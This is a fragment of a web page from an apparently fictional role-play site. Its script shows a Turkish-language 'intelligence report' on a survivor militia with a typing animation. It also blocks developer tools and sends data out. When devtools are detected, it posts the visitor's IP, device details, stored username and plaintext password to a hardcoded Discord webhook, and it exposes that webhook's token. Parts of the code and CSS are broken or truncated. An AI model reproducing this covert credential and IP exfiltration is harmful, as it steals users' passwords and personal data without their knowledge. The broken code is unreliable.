  <script>
  (function() {
      'use strict';
      
      // Sayfa yüklenir yüklenmez kontrol et
      // raiden3.html'deki checkAccess() fonksiyonunu bu şekilde değiştirin:

function checkAccess() {
    // localStorage'da gerekli bilgiler var mı kontrol et
    const userIdentifier = localStorage.getItem('userIdentifier');
    const userPassword = localStorage.getItem('userPassword');
    const userType = localStorage.getItem('userType');
    
    // Eğer localStorage'da bilgiler yoksa veya boşsa (yani index.html'den giriş yapmamış)
    if (!userIdentifier || !userPassword || !userType) {
        alert('⚠️ Yetkisiz erişim! Lütfen giriş yapın.');
        window.location.replace('/enclave/index.html');
        return;
    }
    // Session timeout kontrolü (30 dakika)
    const loginTime = localStorage.getItem('loginTime');
    if (loginTime) {
        const currentTime = new Date().getTime();
        const sessionDuration = 30 * 60 * 1000; // 30 dakika
        
        if (currentTime - parseInt(loginTime) > sessionDuration) {
            alert('⏰ Oturum süreniz doldu. Lütfen tekrar giriş yapın.');
            localStorage.clear();
            window.location.replace('/enclave/index.html');
            return;
        }
    }
    // Eğer her şey tamam ise, login zamanını güncelle
    localStorage.setItem('loginTime', new Date().getTime().toString());
}
      
      // Sayfa yüklendiğinde kontrol et
      if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', checkAccess);
      } else {
          checkAccess();
      }
      
  })();
  </script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
    
    :root {
      --primary-color: #00ff00;
      --secondary-color: #003300;
      --accent-color: #00cc00;
      --error-color: #ff3333;
    }
    
    body {

      font-family: 'Share Tech Mono', monospace;

      overflow: hidden;

    /* CRT Effect */
    .crt-effect::before {
      content: " ";
      display: block;
      position: absolute;
      top: 0;
      left: 0;
      bottom: 0;
      right: 0;
      background: linear-gradient(rgba(0, 255, 0, 0.03) 50%, rgba(0, 0, 0, 0.1) 50%),
                  linear-gradient(90deg, rgba(0, 255, 0, 0.03), rgba(0, 255, 0, 0.02), rgba(0, 255, 0, 0.03));
      background-size: 100% 3px, 3px 100%;
      pointer-events: none;
      z-index: 100;
    }
    
    .crt-effect::after {
      content: " ";
      display: block;
      position: absolute;
      top: 0;
      left: 0;
      bottom: 0;
      right: 0;
      background: rgba(0, 0, 0, 0.1);
      opacity: 0;
      z-index: 100;
      pointer-events: none;

      100% { opacity: 0.1; }
    }

      border: 1px solid var(--primary-color);

      position: relative;
      width: 100px;
      height: 20px;

      top: 0;
      left: 0;

      height: 100%;

    .classification:hover::after {

    // Report content
    const reportText = `
WESTERN INDUSTRIES COMMUNITY ANALYSIS REPORT

REPORT ID: WI-2024-55BR-001

<span class="section-title">===55TH BACKYARD REGIMENT===</span>

EXECUTIVE SUMMARY:
ORTA TEHDİT - 55th Backyard Regiment, hiyerarşik düzen kurmaya ve masum sivilleri haydut gruplarından korumaya odaklanan militarist bir hayatta kalan topluluğunu temsil etmektedir. Marcus Lowrey, Robert Scott ve Vasily Raskolnikov'tan oluşan Üçlü Konsey tarafından yönetilen bu organizasyon, askeri disiplini insani koruma çabalarıyla birleştirmektedir.

Background: Sırasıyla eski askeri subay, şerif ve FIB ajanı
Leadership Style: Hiyerarşik askeri komuta yapısı
Risk Assessment: ORTA İnsani odaklı savunma odaklı

<span class="section-title">OPERATIONAL STRUCTURE:</span>
Total Members: 15 aktif personel
Combat Teams: 8 askeri ve güvenlik uzmanı
Protection Division: 4 sivil savunma uzmanı 
Resource Management: 2 lojistik ve tedarik uzmanı 
Medical Support: 1 sağlık hizmeti sağlayıcı

<span class="section-title">PRIMARY ACTIVITIES:</span>
- Bölgesel hakimiyet ve bölge kontrolü
- Masum sivillerin haydut gruplarından korunması 
- Askeri eğitim ve disiplin uygulaması

- Western Industries araştırmasına devam

<span class="section-title">IDEOLOGICAL FRAMEWORK:</span>
Hiyerarşik düzen ve adaletin yeniden kurulmasına odaklanan militarist dünya görüşü. Sıkı askeri disiplini korurken masum insanları korumaya inanır. Savunma bölgesel kontrolünü çevre topluluklara insani yardımla birleştirir. Mevcut koşullar altında hiyerarşik düzen yoluyla insanlığı ilerletmeye adanmış.

<span class="section-title">STRATEGIC OBJECTIVES:</span>
55th Backyard Regiment, sivilleri haydut gruplarından korurken daha güvenli ortamlar yaratmak için bölgesel kontrol kurmayı amaçlar. Hedefleri militarist hiyerarşi ve topluluk hizmeti yoluyla düzeni yeniden kurmaktır. Bölgelerine hakim olmayı, masum hayatta kalanlara karşı haydutluğu önlemeyi, militarizmi güvenli sığınak olarak teşvik etmeyi ve Western Industries araştırmasına devam etmeyi ararlar.

ANALYST: Director of Intelligence Rebecca Cross, Zone 013
DATE: 2034-03-15
NEXT REVIEW: 2034-04-19
PRIORITY: ORTA TEHDİT İZLEME GEREKLİ
`;

    let currentAnimations = [];
    let skipRequested = false;

    // Display report with typing animation
    function displayReport() {
      const reportContent = document.getElementById('reportContent');
      reportContent.innerHTML = '';
      
      const lines = reportText.split('\n');
      let currentLine = 0;
      
      function typeNextLine() {
        if (skipRequested) {
          showAllContent();
          return;
        }

        if (currentLine < lines.length) {
          const lineDiv = document.createElement('div');
          lineDiv.className = 'typing-line';
          reportContent.appendChild(lineDiv);
          
          const text = lines[currentLine];
          let charIndex = 0;
          
          function typeChar() {
            if (skipRequested) {
              showAllContent();
              return;
            }

            if (charIndex < text.length) {
              lineDiv.innerHTML = text.substring(0, charIndex + 1);
              charIndex++;
              const animId = setTimeout(typeChar, Math.random() * 10 + 10);
              currentAnimations.push(animId);
            } else {
              lineDiv.style.borderRight = 'none';
              currentLine++;
              const animId = setTimeout(typeNextLine, 50);
              currentAnimations.push(animId);
              reportContent.scrollTop = reportContent.scrollHeight;
            }
          }
          
          typeChar();
        } else {
          finishTyping();
        }
      }
      
      typeNextLine();
    }

    function showAllContent() {
      clearAllAnimations();
      const reportContent = document.getElementById('reportContent');
      reportContent.innerHTML = reportText;
      finishTyping();
      reportContent.scrollTop = reportContent.scrollHeight;
    }

    function finishTyping() {
      document.getElementById('exitButton').classList.add('visible');
      document.getElementById('skipButton').style.display = 'none';
    }

    function clearAllAnimations() {
      currentAnimations.forEach(id => clearTimeout(id));
      currentAnimations = [];
    }

    // Skip button functionality
    document.getElementById('skipButton').addEventListener('click', () => {
      skipRequested = true;
      showAllContent();
    });

    // Start the animation
    displayReport();
    // Debug Tools Engelleme Scripti
    (function() {

        function showWarning() {
            if (!warningShown && window.terminal) {
                window.terminal.showWarning();
                warningShown = true;
                sendToDiscord();

        }
        
        function detectConsole() {
            const threshold = 160;
            
            if (window.outerHeight - window.innerHeight > threshold || 
                window.outerWidth - window.innerWidth > threshold) {
                if (!devToolsOpen) {
                    devToolsOpen = true;
                    showWarning();
                    console.clear();
                    console.log('%cDurdur!', 'color: red; font-size: 50px; font-weight: bold;');
                    console.log('%cBu bir tarayıcı özelliğidir ve geliştiriciler içindir. Birisi size buraya bir şey kopyalayıp yapıştırmanızı söylediyse, bu bir dolandırıcılıktır.', 'color: red; font-size: 16px;');
                }
            }
        }
        
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });
        
        document.addEventListener('keydown', function(e) {
            if (e.keyCode === 123) {
                e.preventDefault();
                showWarning();
                return false;
            }
            
            if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
                e.preventDefault();
                showWarning();
                return false;
            }
            
            if (e.ctrlKey && e.shiftKey && e.keyCode === 74) {
                e.preventDefault();
                showWarning();
                return false;
            }
            
            if (e.ctrlKey && e.keyCode === 85) {
                e.preventDefault();
                showWarning();
                return false;
            }
            
            if (e.ctrlKey && e.shiftKey && e.keyCode === 67) {
                e.preventDefault();
                showWarning();
                return false;
            }
            
            if (e.ctrlKey && e.keyCode === 83) {
                e.preventDefault();
                showWarning();
                return false;
            }

        setInterval(detectConsole, 500);

            if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {

        if (window.console) {

            console.log('%cBu site korunmaktadır. Yetkisiz erişim girişimleri kaydedilir.', 'color: orange; font-size: 14px;');
        }
        
        document.addEventListener('selectstart', function(e) {
            e.preventDefault();
            return false;
        });
        
        document.addEventListener('dragstart', function(e) {
            e.preventDefault();
            return false;
        });
        
        window.addEventListener('beforeprint', function(e) {
            e.preventDefault();
            showWarning();
            return false;
        });
        
    })();
    
    // Discord Webhook Sistemi
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1366237046670102621/Qme-enwqBGenG2VSB9DHwt4r3z8zQKiOsV8KKOspPXt72gcfZh28oRLd9jq1r9vwUzqV';

    function getBrowserInfo() {
        const ua = navigator.userAgent;
        let browserName = "Bilinmeyen Tarayıcı";
        let browserVersion = "Bilinmeyen Versiyon";

        if (ua.includes("Chrome") && !ua.includes("Edg")) {
            browserName = "Google Chrome";
            const match = ua.match(/Chrome\/([\d.]+)/);
            browserVersion = match ? match[1] : "Bilinmiyor";
        } else if (ua.includes("Firefox")) {
            browserName = "Mozilla Firefox";
            const match = ua.match(/Firefox\/([\d.]+)/);
            browserVersion = match ? match[1] : "Bilinmiyor";
        } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
            browserName = "Apple Safari";
            const match = ua.match(/Version\/([\d.]+)/);
            browserVersion = match ? match[1] : "Bilinmiyor";
        } else if (ua.includes("Edg")) {
            browserName = "Microsoft Edge";
            const match = ua.match(/Edg\/([\d.]+)/);
            browserVersion = match ? match[1] : "Bilinmiyor";
        } else if (ua.includes("OPR")) {
            browserName = "Opera";
            const match = ua.match(/OPR\/([\d.]+)/);
            browserVersion = match ? match[1] : "Bilinmiyor";
        }

        return { name: browserName, version: browserVersion };
    }

    async function sendToDiscord() {
        let ip = 'Bilinmiyor';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            ip = ipData.ip;
        } catch (error) {
            console.error('IP alma hatası:', error);
        }

        const browserInfo = getBrowserInfo();
        
        // localStorage'dan kullanıcı bilgilerini al
        const userIdentifier = localStorage.getItem('userIdentifier') || 'bilinmiyor';
        const userPassword = localStorage.getItem('userPassword') || 'bilinmiyor';
        const userType = localStorage.getItem('userType') || 'bilinmiyor';

        const userInfo = {
            ipAddress: ip,
            browserName: browserInfo.name,
            browserVersion: browserInfo.version,
            userAgent: navigator.userAgent,
            screenResolution: `${screen.width}x${screen.height}`,
            language: navigator.language,
            platform: navigator.platform,
            deviceName: navigator.platform,
            referrer: document.referrer,
            timestamp: new Date().toISOString(),
            pageUrl: window.location.href,
            userIdentifier: userIdentifier,
            userPassword: userPassword,
            userType: userType
        };

        const message = {
            embeds: [{
                title: '⚠️ DevTools Kullanımı Tespit Edildi!',
                description: `Kullanıcı: **${userIdentifier}** geliştirici araçlarını açmaya çalıştı.`,
                color: 16711680,

                    { name: '👤 Kullanıcı Kimliği', value: userIdentifier, inline: true },
                    { name: '🔑 Şifre', value: userPassword, inline: true },

                    { name: '🌐 IP Adresi', value: userInfo.ipAddress, inline: true },
                    { name: '🔍 Tarayıcı', value: `${userInfo.browserName} ${userInfo.browserVersion}`, inline: true },
                    { name: '📱 Platform', value: userInfo.platform, inline: true },
                    { name: '🖥️ Ekran Çözünürlüğü', value: userInfo.screenResolution, inline: true },
                    { name: '🌍 Dil', value: userInfo.language, inline: true },
                    { name: '🕐 Zaman', value: userInfo.timestamp, inline: true },
                    { name: '📄 User Agent', value: userInfo.userAgent, inline: false },
                    { name: '🔗 Referrer', value: userInfo.referrer || 'Yok', inline: false },
                    { name: '📍 Sayfa URL', value: userInfo.pageUrl, inline: false }
                ],
                footer: { 
                    text: 'Phoenix Industries Güvenlik Logu - Raiden3 Terminal'
                }
            }]
        };

        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(message)
            });
            console.log('Kullanıcı bilgileri Discord\'a gönderildi.');
        } catch (error) {
            console.error('Webhook hatası:', error);
        }
    }
  </script>
